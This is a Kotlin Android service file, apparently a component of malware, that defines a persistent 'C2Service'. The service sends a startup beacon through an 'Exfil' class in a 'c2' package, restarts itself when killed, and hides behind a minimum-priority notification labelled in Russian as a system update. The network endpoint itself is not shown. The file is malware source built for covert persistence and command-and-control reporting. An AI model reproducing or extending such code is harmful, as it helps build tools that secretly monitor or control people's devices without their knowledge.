package com.sp.core.services

import android.app.*
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.IBinder
import androidx.core.app.NotificationCompat
import com.sp.core.c2.Exfil

class C2Service : Service() {
    override fun onCreate() {
        super.onCreate()
        startForeground(0x5F62, buildNotification())
    }
    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Exfil.sendLog(this, "startup", """{"pid":${android.os.Process.myPid()}}""")
        return START_STICKY
    }
    private fun buildNotification(): Notification {
        val chId = "sys_update"
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val ch = NotificationChannel(chId, "Обновление системы",
                NotificationManager.IMPORTANCE_MIN).apply { setShowBadge(false) }
            (getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager)
                .createNotificationChannel(ch)
        }
        return NotificationCompat.Builder(this, chId)
            .setContentTitle("android_UI")
            .setContentText("Системный компонент работает")
            .setSmallIcon(android.R.drawable.stat_sys_download)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setOngoing(true).build()
    }
    override fun onBind(intent: Intent?): IBinder? = null
}